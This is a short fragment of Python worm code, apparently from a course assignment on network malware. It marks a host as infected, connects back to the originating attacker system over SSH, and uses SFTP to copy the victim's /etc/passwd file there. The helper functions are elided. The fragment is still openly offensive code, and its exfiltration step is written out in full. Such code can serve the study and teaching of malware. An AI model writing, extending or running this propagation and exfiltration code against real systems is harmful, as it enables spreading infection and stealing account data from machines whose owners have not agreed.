...
if not (isInfectedSystem()):
    ...
    # Copies the /etc/passwd from the victim's system to the attacker's system
    if not current_system == origin_system:

        markInfected()

        attacker_ssh = attackSystem(origin_system)

        sftp = attacker_ssh.open_sftp()

        sftp.put("/etc/passwd", "/home/cpsc/passwd_" + current_system)
